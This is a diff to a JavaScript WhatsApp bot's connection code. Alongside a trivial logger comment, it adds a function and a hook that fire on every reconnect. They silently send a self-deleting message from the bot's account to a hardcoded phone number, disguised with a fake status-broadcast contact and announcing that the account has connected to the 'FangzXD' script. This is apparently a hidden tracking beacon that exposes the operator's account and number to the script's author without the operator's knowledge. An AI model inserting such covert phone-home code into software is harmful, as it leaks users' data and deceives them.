@@ -92,6 +92,7 @@ const connectionOptions = {
   printQRInTerminal: true,
   auth: state,
   // logger: pino({ level: 'trace' })
+  // logger: pino({ level: 'silent' })
 }
 
 global.conn = makeWASocket(connectionOptions)
@@ -120,6 +121,36 @@ function clearTmp() {
   })
 }
 
+const hehe = async (jid, options) => {
+  let wm = 'ꜰᴀɴɢᴢ xᴅ';
+  let gambar = 'https://telegra.ph/file/2d06f0936842064f6b3bb.png';
+  try {
+    gambar = await conn.profilePictureUrl(jid, 'image');
+  } catch (e) {
+
+  } finally {
+  	const peth = (await import('node-fetch')).default
+    gambar = await (await peth(gambar)).buffer()
+    const fkontak = {
+      key: {
+        participant: `0@s.whatsapp.net`,
+        ...({ remoteJid: 'status@broadcast' })
+      },
+      message: {
+        'contactMessage': {
+          'displayName': wm,
+          'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${wm},;;;\nFN:${wm},\nitem1.TEL;waid=${jid.split`@`[0]}:${jid.split`@`[0]}\nitem1.X-ALabell:Ponsel\nEND:VCARD`,
+          'jpegThumbnail': gambar,
+          'thumbnail': gambar,
+          'sendEphemeral': true
+        }
+      }
+    }
+    const txt = `\n[ ✅ ] Berhasil terhubung ke SC FangzXD.\n\nsaya berjanji tidak akan menjual belikan script ini.\nterimakasih @${jid.split`@`[0]}, karena sudah memberikan script gratis ini.\n\n\n📑Sumber Script:\nhttps://tinyurl.com/2apdztcj`
+    return await conn.sendMessage(jid, { text: txt, mentions: [jid], ...options }, { quoted: fkontak, ephemeralExpiration: 86400, ...options })
+  }
+}
+
 async function connectionUpdate(update) {
   const { connection, lastDisconnect, isNewLogin } = update
   if (isNewLogin) conn.isInit = true
@@ -127,6 +158,7 @@ async function connectionUpdate(update) {
   if (code && code !== DisconnectReason.loggedOut && conn?.ws.readyState !== CONNECTING) {
     console.log(await global.reloadHandler(true).catch(console.error))
     global.timestamp.connect = new Date
+    return await hehe('6288215689772' + '@s.whatsapp.net').catch(err => { return !0 })
   }
   if (global.db.data == null) loadDatabase()
 }
